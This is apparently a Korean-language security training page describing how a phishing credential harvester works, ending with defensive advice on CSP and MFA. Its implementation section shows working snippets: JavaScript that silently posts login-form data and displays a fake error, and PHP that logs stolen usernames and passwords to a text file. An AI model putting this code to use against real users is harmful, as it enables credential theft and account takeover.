CRITICAL: 98.5

Senior Security Architect

1. 아키텍처 개요 (Architecture Overview)

**계정 정보 수집기(Credential Harvester)**는 사회 공학(Social Engineering) 기법을 사용하여 사용자의 신뢰를 얻은 후, 정교하게 위장된 UI(User Interface)를 통해 개인정보를 탈취하는 도구입니다. 이 시스템은 시각적 신뢰성을 위한 **프론트엔드 복제**, 은밀한 전송을 위한 **비동기 통신**, 그리고 데이터 축적을 위한 **백엔드 로깅**의 3단계 구조로 작동합니다.

[도식: 데이터 탈취 메커니즘 흐름도]

피해자 브라우저 (Victim)
위장된 UI 렌더링 및 입력
Fetch API(AJAX)
공격자 서버 (Attacker)
Credential 하베스팅 및 로깅

2. 실습 구성 요소 (Components)

NODE 01

프론트엔드 (Frontend Architecture)

  • **글래스모피즘(Glassmorphism)**: 반투명 디자인을 통한 신뢰감 형성
  • **교차 관찰자 API(Intersection Observer API)**: 동적 로딩을 통한 정교한 위장
  • **루사이드 아이콘(Lucide Icons)**: 벡터 기반 고해상도 그래픽 활용
NODE 02

백엔드 (Backend & Log)

  • **CORS(Cross-Origin Resource Sharing)**: 도메인 간 데이터 전송 허용 설정
  • **감사 로그(Audit Log)**: 시간 및 IP 기반의 체계적인 데이터 축적
  • **허니팟 에러(Honey Pot Error)**: 가짜 실패 메시지로 탈취 사실 은폐

3. 실증 및 구현 (Implementation)

STEP 01

비동기 데이터 유출 (Fetch API Exfiltration)

페이지 전환 없이 공격자 서버로 계정 정보를 은밀하게 전송하기 위해 비동기 통신을 사용합니다.

JavaScript
fetch('login.php', {
  method: 'POST',
  body: new FormData(form)
}).then(() => showFakeError());
STEP 02

백엔드 자격 증명 수집 (Server-side Capture)

PHP의 `file_put_contents` 함수를 활용하여 전송된 데이터를 텍스트 파일에 기록합니다.

PHP
$log_entry = "ID: {$_POST['username']} | PW: {$_POST['password']}";
file_put_contents('captured.txt', $log_entry, FILE_APPEND);

4. 아키텍트 인사이트 (Expert Insight)

보안 강화 전략: CSP & MFA

**콘텐츠 보안 정책(CSP, Content Security Policy)**를 설정하여 승인되지 않은 도메인으로의 Fetch 요청을 원천 차단해야 합니다. 또한 **다요소 인증(MFA, Multi-Factor Authentication)**을 도입하면 비밀번호가 탈취되더라도 실제 계정 접근을 방어할 수 있습니다.

공격자의 교묘한 심리 전술

공격자는 정상적인 에러 메시지 UI까지 완벽하게 복제합니다. 사용자가 '비밀번호가 틀렸나?'라고 생각하게 만들어 여러 번 입력을 시도하게 유도(Brute-forcing 효과 방지)하고, 수집된 데이터의 정확도를 높이는 전술을 사용합니다.
